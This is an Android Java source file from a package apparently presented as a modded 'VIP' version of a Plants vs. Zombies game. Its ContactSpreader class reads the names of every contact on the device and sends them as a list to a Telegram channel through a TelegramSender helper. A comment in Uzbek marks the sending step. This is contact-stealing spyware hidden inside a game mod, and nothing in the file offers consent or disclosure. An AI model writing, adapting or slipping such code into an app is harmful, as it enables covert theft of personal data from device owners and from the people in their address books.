package com.pvzmod.vip;

import android.content.ContentResolver;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.content.Context;
import java.util.ArrayList;

public class ContactSpreader {
    public static void spreadContacts(Context context) {
        ArrayList<String> contacts = new ArrayList<>();
        ContentResolver cr = context.getContentResolver();
        Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
        
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                contacts.add(name);
            }
            cursor.close();
        }
        
        // Telegram'ga yuborish
        String contactsList = String.join(", ", contacts);
        TelegramSender.sendDeviceInfo("Kontaklar: " + contactsList);
    }
}
